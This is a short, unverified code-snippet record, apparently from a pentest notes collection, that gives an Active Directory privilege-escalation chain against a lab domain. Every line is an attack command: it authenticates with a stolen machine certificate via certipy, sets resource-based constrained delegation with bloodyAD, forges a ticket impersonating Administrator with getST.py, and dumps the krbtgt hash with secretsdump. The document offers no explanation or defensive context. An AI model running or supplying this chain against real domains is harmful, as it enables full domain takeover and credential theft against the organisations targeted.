---
id: 0d53b1f4-b76d-44a7-89da-aae37bf23ab2
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:06.137520+00:00'
updated_at: '2023-04-10T20:36:10.277684+00:00'
---

# Code Snippet 0d53b1f4

**Language**: ps1

```ps1
certipy auth -pfx ./dc.pfx -dc-ip 10.10.10.10

openssl pkcs12 -in dc.pfx -out dc.pem -nodes
python bloodyAD.py -d lab.local  -c ":dc.pem" -u 'cve$' --host 10.10.10.10 setRbcd 'CVE$' 'CRASHDC$'
getST.py -spn LDAP/CRASHDC.lab.local -impersonate Administrator -dc-ip 10.10.10.10 'lab.local/cve$:CVEPassword1234*'   
secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'lab.local/Administrator@dc.lab.local' -k -no-pass -dc-ip 10.10.10.10 -target-ip 10.10.10.10 
```


